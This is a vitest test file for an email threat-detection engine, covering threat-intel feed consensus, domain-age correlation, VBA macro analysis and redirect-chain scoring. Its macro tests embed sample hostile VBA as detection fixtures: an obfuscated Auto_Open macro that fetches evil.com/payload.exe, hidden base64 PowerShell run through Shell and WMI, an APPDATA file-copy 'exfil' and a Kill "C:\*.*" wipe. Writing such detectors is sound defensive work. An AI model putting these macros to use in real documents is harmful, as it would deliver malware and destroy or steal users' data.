/**
 * Phase 4b Enhancement Tests - TDD
 *
 * Multi-layer Threat Intel Integration (+2.5 pts)
 * Domain Age Temporal Correlation (+1 pt)
 * Enhanced Macro Analysis (+1 pt)
 * URL Redirect Chain Analysis (+1.5 pts)
 *
 * Expected Total Impact: +6 points (86 → 92/100)
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import type { Signal, LayerResult } from '@/lib/detection/types';

// ============================================================================
// Multi-layer Threat Intel Integration Tests (+2.5 pts)
// ============================================================================

describe('Phase 4b: Multi-layer Threat Intel Integration', () => {
  describe('Feed Aggregation with Consensus Voting', () => {
    it('should aggregate intelligence from multiple threat feeds', async () => {
      const { aggregateThreatIntelligence } = await import('@/lib/detection/phase4b-threat-intel');

      const url = 'https://malicious-site.com/phishing';
      const result = await aggregateThreatIntelligence(url, {
        feeds: ['virustotal', 'urlhaus', 'phishtank', 'openphish'],
      });

      expect(result).toBeDefined();
      expect(result.sources).toBeInstanceOf(Array);
      expect(result.consensusScore).toBeGreaterThanOrEqual(0);
      expect(result.consensusScore).toBeLessThanOrEqual(100);
      expect(result.agreementRatio).toBeGreaterThanOrEqual(0);
      expect(result.agreementRatio).toBeLessThanOrEqual(1);
    });

    it('should give higher confidence when multiple sources agree', async () => {
      const { aggregateThreatIntelligence } = await import('@/lib/detection/phase4b-threat-intel');

      // Mock scenario: All sources agree URL is malicious
      const result = await aggregateThreatIntelligence('https://known-bad.com/malware', {
        feeds: ['virustotal', 'urlhaus'],
        mockResponses: {
          virustotal: { verdict: 'malicious', score: 85 },
          urlhaus: { verdict: 'malicious', score: 90 },
        },
      });

      expect(result.confidence).toBeGreaterThanOrEqual(0.8);
      expect(result.consensusScore).toBeGreaterThanOrEqual(80);
    });

    it('should lower confidence when sources disagree', async () => {
      const { aggregateThreatIntelligence } = await import('@/lib/detection/phase4b-threat-intel');

      // Mock scenario: Sources disagree
      const result = await aggregateThreatIntelligence('https://borderline-site.com', {
        feeds: ['virustotal', 'urlhaus', 'phishtank'],
        mockResponses: {
          virustotal: { verdict: 'clean', score: 10 },
          urlhaus: { verdict: 'suspicious', score: 50 },
          phishtank: { verdict: 'malicious', score: 95 },
        },
      });

      expect(result.confidence).toBeLessThan(0.7);
      expect(result.disagreement).toBe(true);
    });

    it('should weight sources by reliability', async () => {
      const { aggregateThreatIntelligence } = await import('@/lib/detection/phase4b-threat-intel');

      const result = await aggregateThreatIntelligence('https://test-url.com', {
        feeds: ['virustotal', 'unknown_feed'],
        mockResponses: {
          virustotal: { verdict: 'malicious', score: 80, reliability: 0.95 },
          unknown_feed: { verdict: 'clean', score: 10, reliability: 0.3 },
        },
      });

      // VirusTotal (high reliability) should have more weight
      expect(result.consensusScore).toBeGreaterThan(50);
    });
  });

  describe('Real-time vs Cached Intelligence', () => {
    it('should use cached intel within TTL', async () => {
      const { aggregateThreatIntelligence, getThreatIntelCache } = await import('@/lib/detection/phase4b-threat-intel');

      const url = 'https://cached-lookup.com';

      // First call - should query feeds
      const result1 = await aggregateThreatIntelligence(url, { feeds: ['virustotal'] });

      // Second call - should use cache
      const result2 = await aggregateThreatIntelligence(url, { feeds: ['virustotal'] });

      expect(result2.fromCache).toBe(true);
      expect(result2.consensusScore).toBe(result1.consensusScore);
    });

    it('should refresh cache when TTL expires', async () => {
      const { aggregateThreatIntelligence, clearThreatIntelCache } = await import('@/lib/detection/phase4b-threat-intel');

      const url = 'https://ttl-test.com';

      // Clear any existing cache
      clearThreatIntelCache(url);

      // First call with short TTL
      const result1 = await aggregateThreatIntelligence(url, {
        feeds: ['virustotal'],
        cacheTtlMs: 1, // 1ms TTL
      });

      // Wait for TTL to expire
      await new Promise(resolve => setTimeout(resolve, 10));

      // Second call should NOT be from cache
      const result2 = await aggregateThreatIntelligence(url, {
        feeds: ['virustotal'],
        forceRefresh: true,
      });

      expect(result2.fromCache).toBe(false);
    });
  });

  describe('Threat Intel Signal Generation', () => {
    it('should generate signals from aggregated intelligence', async () => {
      const { aggregateThreatIntelligence, convertThreatIntelToSignals } = await import('@/lib/detection/phase4b-threat-intel');

      const result = await aggregateThreatIntelligence('https://phishing-site.com', {
        feeds: ['virustotal', 'phishtank'],
        mockResponses: {
          virustotal: { verdict: 'malicious', score: 90, category: 'phishing' },
          phishtank: { verdict: 'malicious', score: 95, category: 'phishing' },
        },
      });

      const signals = convertThreatIntelToSignals(result);

      expect(signals.length).toBeGreaterThan(0);
      expect(signals.some(s => s.type === 'threat_intel_consensus')).toBe(true);
      expect(signals.find(s => s.type === 'threat_intel_consensus')?.severity).toBe('critical');
    });

    it('should include source-specific signals', async () => {
      const { aggregateThreatIntelligence, convertThreatIntelToSignals } = await import('@/lib/detection/phase4b-threat-intel');

      const result = await aggregateThreatIntelligence('https://malware-host.com', {
        feeds: ['virustotal', 'urlhaus'],
        mockResponses: {
          virustotal: { verdict: 'malicious', score: 85, malwareFamily: 'Emotet' },
          urlhaus: { verdict: 'malicious', score: 90, tags: ['botnet', 'c2'] },
        },
      });

      const signals = convertThreatIntelToSignals(result);

      // Should have malware family signal
      expect(signals.some(s => s.metadata?.malwareFamily === 'Emotet')).toBe(true);
      // Should have threat tags
      expect(signals.some(s => s.metadata?.tags?.includes('botnet'))).toBe(true);
    });
  });
});

// ============================================================================
// Domain Age Temporal Correlation Tests (+1 pt)
// ============================================================================

describe('Phase 4b: Domain Age Temporal Correlation', () => {
  describe('Domain Age + Signal Correlation', () => {
    it('should amplify BEC signals when domain is newly registered', async () => {
      const { correlateDomainAgeWithSignals } = await import('@/lib/detection/phase4b-domain-correlation');

      const signals: Signal[] = [
        { type: 'bec_impersonation', severity: 'warning', score: 25, detail: 'CEO impersonation detected' },
        { type: 'bec_financial_risk', severity: 'warning', score: 20, detail: 'Wire transfer request' },
      ];

      const domainAge = {
        domain: 'new-domain.com',
        ageDays: 5,
        riskLevel: 'critical' as const,
      };

      const result = correlateDomainAgeWithSignals(signals, domainAge);

      expect(result.amplificationApplied).toBe(true);
      expect(result.amplificationMultiplier).toBeGreaterThanOrEqual(1.5);
      expect(result.correlatedSignals.length).toBeGreaterThan(signals.length);
      expect(result.correlatedSignals.some(s => s.type === 'domain_age_bec_correlation')).toBe(true);
    });

    it('should amplify credential phishing when domain mimics known brand', async () => {
      const { correlateDomainAgeWithSignals } = await import('@/lib/detection/phase4b-domain-correlation');

      const signals: Signal[] = [
        { type: 'credential_request', severity: 'warning', score: 20, detail: 'Password request detected' },
      ];

      const domainAge = {
        domain: 'micros0ft-login.com',
        ageDays: 14,
        riskLevel: 'high' as const,
        lookalikeTarget: 'microsoft.com',
      };

      const result = correlateDomainAgeWithSignals(signals, domainAge);

      expect(result.amplificationApplied).toBe(true);
      expect(result.correlatedSignals.some(s => s.type === 'domain_age_lookalike_correlation')).toBe(true);
      expect(result.correlatedSignals.find(s => s.type === 'domain_age_lookalike_correlation')?.severity).toBe('critical');
    });

    it('should NOT amplify signals when domain is well-established', async () => {
      const { correlateDomainAgeWithSignals } = await import('@/lib/detection/phase4b-domain-correlation');

      const signals: Signal[] = [
        { type: 'bec_urgency_pressure', severity: 'info', score: 10, detail: 'Urgency detected' },
      ];

      const domainAge = {
        domain: 'established-company.com',
        ageDays: 730, // 2 years old
        riskLevel: 'safe' as const,
      };

      const result = correlateDomainAgeWithSignals(signals, domainAge);

      expect(result.amplificationApplied).toBe(false);
      expect(result.amplificationMultiplier).toBe(1.0);
    });
  });

  describe('Temporal Pattern Detection', () => {
    it('should detect suspicious domain registration timing', async () => {
      const { analyzeRegistrationTiming } = await import('@/lib/detection/phase4b-domain-correlation');

      // Domain registered just before a campaign targeting an organization
      const result = analyzeRegistrationTiming({
        domain: 'company-hr-portal.com',
        registrationDate: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000), // 3 days ago
        targetOrganization: 'company.com',
      });

      expect(result.isSuspicious).toBe(true);
      expect(result.suspicionReason).toContain('recent_registration_targeting');
      expect(result.riskScore).toBeGreaterThanOrEqual(7);
    });

    it('should correlate domain age with free email provider usage', async () => {
      const { correlateDomainAgeWithSignals } = await import('@/lib/detection/phase4b-domain-correlation');

      const signals: Signal[] = [
        { type: 'free_email_provider', severity: 'info', score: 5, detail: 'Gmail sender' },
        { type: 'bec_impersonation', severity: 'warning', score: 20, detail: 'Executive impersonation' },
      ];

      // Email from Gmail but links to newly registered domain
      const domainAge = {
        domain: 'urgent-invoice.com',
        ageDays: 7,
        riskLevel: 'critical' as const,
        inEmailLinks: true, // Domain appears in email links, not sender
      };

      const result = correlateDomainAgeWithSignals(signals, domainAge);

      expect(result.correlatedSignals.some(s => s.type === 'new_domain_in_links')).toBe(true);
    });
  });

  describe('First-Contact + Domain Age Compound Risk', () => {
    it('should calculate compound risk for first-contact with new domain', async () => {
      const { calculateCompoundDomainRisk } = await import('@/lib/detection/phase4b-domain-correlation');

      const signals: Signal[] = [
        { type: 'first_contact', severity: 'warning', score: 15, detail: 'Never seen this sender' },
        { type: 'bec_financial_risk', severity: 'warning', score: 20, detail: 'Wire transfer request' },
      ];

      const domainAge = {
        domain: 'new-vendor-payment.com',
        ageDays: 10,
        riskLevel: 'high' as const,
      };

      const compoundRisk = calculateCompoundDomainRisk(signals, domainAge);

      expect(compoundRisk.isCompoundThreat).toBe(true);
      expect(compoundRisk.riskMultiplier).toBeGreaterThanOrEqual(2.0);
      expect(compoundRisk.threatPattern).toBe('new_vendor_fraud');
    });
  });
});

// ============================================================================
// Enhanced Macro Analysis Tests (+1 pt)
// ============================================================================

describe('Phase 4b: Enhanced Macro Analysis', () => {
  describe('Advanced VBA Pattern Detection', () => {
    it('should detect obfuscated VBA code patterns', async () => {
      const { analyzeVBAPatterns } = await import('@/lib/detection/phase4b-macro-analysis');

      // Simulated obfuscated VBA code
      const vbaCode = `
        Sub Auto_Open()
          Dim x As String
          x = Chr(104) & Chr(116) & Chr(116) & Chr(112) ' "http"
          Shell x & "://evil.com/payload.exe", vbHide
        End Sub
      `;

      const result = analyzeVBAPatterns(vbaCode);

      expect(result.isObfuscated).toBe(true);
      expect(result.obfuscationTechniques).toContain('chr_concatenation');
      expect(result.suspiciousPatterns).toContain('shell_execution');
      expect(result.riskScore).toBeGreaterThanOrEqual(80);
    });

    it('should detect base64 encoded payloads in VBA', async () => {
      const { analyzeVBAPatterns } = await import('@/lib/detection/phase4b-macro-analysis');

      const vbaCode = `
        Sub Document_Open()
          Dim encoded As String
          encoded = "UG93ZXJTaGVsbCAtZW5jIFVtVmhaSFJ2Y3c9PQ=="
          Dim decoded As String
          decoded = Base64Decode(encoded)
          Shell decoded, vbHide
        End Sub
      `;

      const result = analyzeVBAPatterns(vbaCode);

      expect(result.suspiciousPatterns).toContain('base64_payload');
      expect(result.decodedPayloads).toBeDefined();
      expect(result.decodedPayloads.length).toBeGreaterThan(0);
    });

    it('should detect WMI/PowerShell invocation patterns', async () => {
      const { analyzeVBAPatterns } = await import('@/lib/detection/phase4b-macro-analysis');

      const vbaCode = `
        Sub Auto_Open()
          Set objWMI = GetObject("winmgmts:")
          Set objProcess = objWMI.Get("Win32_Process")
          objProcess.Create "powershell -enc UmVhZHRvYw==", , , pid
        End Sub
      `;

      const result = analyzeVBAPatterns(vbaCode);

      expect(result.suspiciousPatterns).toContain('wmi_execution');
      expect(result.suspiciousPatterns).toContain('powershell_invocation');
      expect(result.riskScore).toBeGreaterThanOrEqual(90);
    });

    it('should detect environment variable abuse', async () => {
      const { analyzeVBAPatterns } = await import('@/lib/detection/phase4b-macro-analysis');

      const vbaCode = `
        Sub Workbook_Open()
          appdata = Environ("APPDATA")
          Shell "cmd /c copy " & appdata & "\*.txt c:\exfil\"
        End Sub
      `;

      const result = analyzeVBAPatterns(vbaCode);

      expect(result.suspiciousPatterns).toContain('environ_abuse');
      expect(result.suspiciousPatterns).toContain('data_exfiltration');
    });
  });

  describe('Auto-Execute Behavior Analysis', () => {
    it('should identify all auto-execute triggers', async () => {
      const { identifyAutoExecTriggers } = await import('@/lib/detection/phase4b-macro-analysis');

      const macroInfo = {
        name: 'AutoOpen',
        code: 'Sub Auto_Open()\n  MsgBox "Hello"\nEnd Sub',
      };

      const triggers = identifyAutoExecTriggers([macroInfo]);

      expect(triggers.length).toBeGreaterThan(0);
      expect(triggers.some(t => t.type === 'document_open')).toBe(true);
      expect(triggers.some(t => t.isAutomatic)).toBe(true);
    });

    it('should detect event-based triggers', async () => {
      const { identifyAutoExecTriggers } = await import('@/lib/detection/phase4b-macro-analysis');

      const macros = [
        { name: 'Workbook_Open', code: 'Private Sub Workbook_Open()\n  Shell "calc.exe"\nEnd Sub' },
        { name: 'Document_Close', code: 'Private Sub Document_Close()\n  Kill "C:\\*.*"\nEnd Sub' },
      ];

      const triggers = identifyAutoExecTriggers(macros);

      expect(triggers.some(t => t.type === 'workbook_open')).toBe(true);
      expect(triggers.some(t => t.type === 'document_close')).toBe(true);
      expect(triggers.some(t => t.action === 'shell_execution')).toBe(true);
    });
  });

  describe('Macro Risk Scoring', () => {
    it('should calculate comprehensive macro risk score', async () => {
      const { calculateMacroRiskScore } = await import('@/lib/detection/phase4b-macro-analysis');

      const analysisResult = {
        hasMacros: true,
        macroCount: 3,
        hasAutoExec: true,
        hasNetworkCalls: true,
        hasShellExec: true,
        hasFileOperations: true,
        isObfuscated: true,
        suspiciousKeywordCount: 5,
      };

      const score = calculateMacroRiskScore(analysisResult);

      expect(score).toBeGreaterThanOrEqual(85);
    });

    it('should give low score to benign macros', async () => {
      const { calculateMacroRiskScore } = await import('@/lib/detection/phase4b-macro-analysis');

      const analysisResult = {
        hasMacros: true,
        macroCount: 1,
        hasAutoExec: false,
        hasNetworkCalls: false,
        hasShellExec: false,
        hasFileOperations: false,
        isObfuscated: false,
        suspiciousKeywordCount: 0,
      };

      const score = calculateMacroRiskScore(analysisResult);

      expect(score).toBeLessThanOrEqual(20);
    });
  });

  describe('Macro Signal Generation', () => {
    it('should generate detailed signals from macro analysis', async () => {
      const { convertMacroAnalysisToSignals } = await import('@/lib/detection/phase4b-macro-analysis');

      const analysis = {
        hasMacros: true,
        isObfuscated: true,
        obfuscationTechniques: ['chr_concatenation', 'base64_encoding'],
        suspiciousPatterns: ['shell_execution', 'network_call'],
        autoExecTriggers: ['Document_Open'],
        riskScore: 90,
      };

      const signals = convertMacroAnalysisToSignals(analysis);

      expect(signals.some(s => s.type === 'macro_obfuscated')).toBe(true);
      expect(signals.some(s => s.type === 'macro_auto_exec')).toBe(true);
      expect(signals.some(s => s.type === 'macro_suspicious_pattern')).toBe(true);
      expect(signals.find(s => s.type === 'macro_obfuscated')?.severity).toBe('critical');
    });
  });
});

// ============================================================================
// URL Redirect Chain Analysis Tests (+1.5 pts)
// ============================================================================

describe('Phase 4b: URL Redirect Chain Analysis', () => {
  describe('Multi-Hop Redirect Detection', () => {
    it('should detect and analyze multi-hop redirects', async () => {
      const { analyzeRedirectChainAdvanced } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'https://click.marketing.com/track', statusCode: 302 },
        { url: 'https://bit.ly/abc123', statusCode: 301 },
        { url: 'https://tinyurl.com/xyz789', statusCode: 301 },
        { url: 'https://suspicious-site.tk/payload', statusCode: 200 },
      ];

      const result = analyzeRedirectChainAdvanced(chain);

      expect(result.hopCount).toBe(4);
      expect(result.shortenerCount).toBe(2);
      expect(result.isSuspicious).toBe(true);
      expect(result.signals).toContain('excessive_redirects');
      expect(result.signals).toContain('multiple_shorteners');
    });

    it('should flag rapid domain hops', async () => {
      const { analyzeRedirectChainAdvanced } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'https://domain1.com/a', statusCode: 302 },
        { url: 'https://domain2.net/b', statusCode: 302 },
        { url: 'https://domain3.org/c', statusCode: 302 },
        { url: 'https://domain4.ru/d', statusCode: 200 },
      ];

      const result = analyzeRedirectChainAdvanced(chain);

      expect(result.uniqueDomains).toBe(4);
      expect(result.signals).toContain('rapid_domain_hopping');
      expect(result.riskScore).toBeGreaterThanOrEqual(7);
    });
  });

  describe('Protocol Downgrade Detection', () => {
    it('should detect HTTPS to HTTP downgrade', async () => {
      const { analyzeRedirectChainAdvanced } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'https://secure-bank.com/login', statusCode: 302 },
        { url: 'http://insecure-phishing.com/capture', statusCode: 200 },
      ];

      const result = analyzeRedirectChainAdvanced(chain);

      expect(result.hasProtocolDowngrade).toBe(true);
      expect(result.signals).toContain('https_to_http_downgrade');
      expect(result.riskScore).toBeGreaterThanOrEqual(8);
    });

    it('should NOT flag HTTP to HTTPS upgrade', async () => {
      const { analyzeRedirectChainAdvanced } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'http://example.com', statusCode: 301 },
        { url: 'https://example.com', statusCode: 200 },
      ];

      const result = analyzeRedirectChainAdvanced(chain);

      expect(result.hasProtocolDowngrade).toBe(false);
      expect(result.signals).not.toContain('https_to_http_downgrade');
    });
  });

  describe('Geographic/TLD Hop Detection', () => {
    it('should detect suspicious TLD changes in chain', async () => {
      const { analyzeRedirectChainAdvanced } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'https://company.com/link', statusCode: 302 },
        { url: 'https://company.ru/redirect', statusCode: 302 },
        { url: 'https://final.cn/payload', statusCode: 200 },
      ];

      const result = analyzeRedirectChainAdvanced(chain);

      expect(result.tldChanges).toEqual(['.com', '.ru', '.cn']);
      expect(result.signals).toContain('suspicious_tld_change');
      expect(result.signals).toContain('high_risk_tld_destination');
    });

    it('should flag redirect from trusted to untrusted TLD', async () => {
      const { analyzeRedirectChainAdvanced } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'https://microsoft.com/download', statusCode: 302 },
        { url: 'https://microsoft-update.tk/file.exe', statusCode: 200 },
      ];

      const result = analyzeRedirectChainAdvanced(chain);

      expect(result.signals).toContain('brand_to_suspicious_tld');
      expect(result.riskScore).toBeGreaterThanOrEqual(9);
    });
  });

  describe('Redirect Chain Reputation Integration', () => {
    it('should aggregate reputation through the chain', async () => {
      const { analyzeRedirectChainWithReputation } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'https://trusted.com/link', statusCode: 302, reputation: 95 },
        { url: 'https://unknown.net/redirect', statusCode: 302, reputation: 50 },
        { url: 'https://malicious.tk/payload', statusCode: 200, reputation: 5 },
      ];

      const result = await analyzeRedirectChainWithReputation(chain);

      expect(result.reputationDecline).toBe(true);
      expect(result.minReputation).toBe(5);
      expect(result.reputationDropPercent).toBeGreaterThan(90);
      expect(result.signals).toContain('reputation_decline_in_chain');
    });

    it('should identify cloaking redirects', async () => {
      const { detectCloakingRedirects } = await import('@/lib/detection/phase4b-redirect-analysis');

      const chain = [
        { url: 'https://legitimate-looking.com', userAgent: 'GoogleBot', statusCode: 200 },
        { url: 'https://different-page.com/malware', userAgent: 'Mozilla/5.0', statusCode: 200 },
      ];

      const result = detectCloakingRedirects(chain);

      expect(result.isCloaking).toBe(true);
      expect(result.technique).toBe('user_agent_based');
    });
  });

  describe('Redirect Chain Signal Generation', () => {
    it('should generate comprehensive signals from chain analysis', async () => {
      const { convertRedirectAnalysisToSignals } = await import('@/lib/detection/phase4b-redirect-analysis');

      const analysis = {
        hopCount: 5,
        hasProtocolDowngrade: true,
        hasSuspiciousTldChange: true,
        shortenerCount: 2,
        endsAtIpAddress: false,
        riskScore: 85,
      };

      const signals = convertRedirectAnalysisToSignals(analysis);

      expect(signals.some(s => s.type === 'redirect_chain_risk')).toBe(true);
      expect(signals.some(s => s.type === 'protocol_downgrade')).toBe(true);
      expect(signals.find(s => s.type === 'redirect_chain_risk')?.score).toBeGreaterThanOrEqual(30);
    });
  });
});

// ============================================================================
// Integration Tests - All Phase 4b Components
// ============================================================================

describe('Phase 4b: Integration Tests', () => {
  describe('Combined Scoring', () => {
    it('should calculate total Phase 4b score contribution', async () => {
      const { calculatePhase4bScore } = await import('@/lib/detection/phase4b-integration');

      const layerResults: LayerResult[] = [
        { layer: 'deterministic', score: 40, confidence: 0.9, signals: [] },
        { layer: 'bec', score: 60, confidence: 0.8, signals: [] },
      ];

      const phase4bEnhancements = {
        threatIntelResult: {
          consensusScore: 85,
          confidence: 0.9,
        },
        domainCorrelation: {
          amplificationMultiplier: 1.5,
          compoundThreat: true,
        },
        macroAnalysis: {
          riskScore: 75,
          hasAutoExec: true,
        },
        redirectAnalysis: {
          riskScore: 70,
          hopCount: 4,
        },
      };

      const result = calculatePhase4bScore(layerResults, phase4bEnhancements);

      // Phase 4b should add +6 points to score
      expect(result.phase4bContribution).toBeGreaterThanOrEqual(5);
      expect(result.phase4bContribution).toBeLessThanOrEqual(10);
      expect(result.totalScore).toBeGreaterThan(60);
    });
  });

  describe('Pipeline Integration', () => {
    it('should integrate Phase 4b analysis into detection pipeline', async () => {
      const { runPhase4bAnalysis } = await import('@/lib/detection/phase4b-integration');

      const email = {
        from: { address: 'ceo@new-company.com', name: 'CEO' },
        to: [{ address: 'finance@company.com' }],
        subject: 'Urgent Wire Transfer',
        body: 'Please process immediately: https://payment-portal.tk/invoice',
        attachments: [{
          filename: 'invoice.xlsm',
          contentType: 'application/vnd.ms-excel.sheet.macroEnabled.12',
          content: Buffer.from('mock macro content'),
        }],
      };

      const result = await runPhase4bAnalysis(email, 'tenant-123');

      expect(result.threatIntel).toBeDefined();
      expect(result.domainCorrelation).toBeDefined();
      expect(result.macroAnalysis).toBeDefined();
      expect(result.redirectAnalysis).toBeDefined();
      expect(result.totalSignals.length).toBeGreaterThan(0);
    });
  });
});
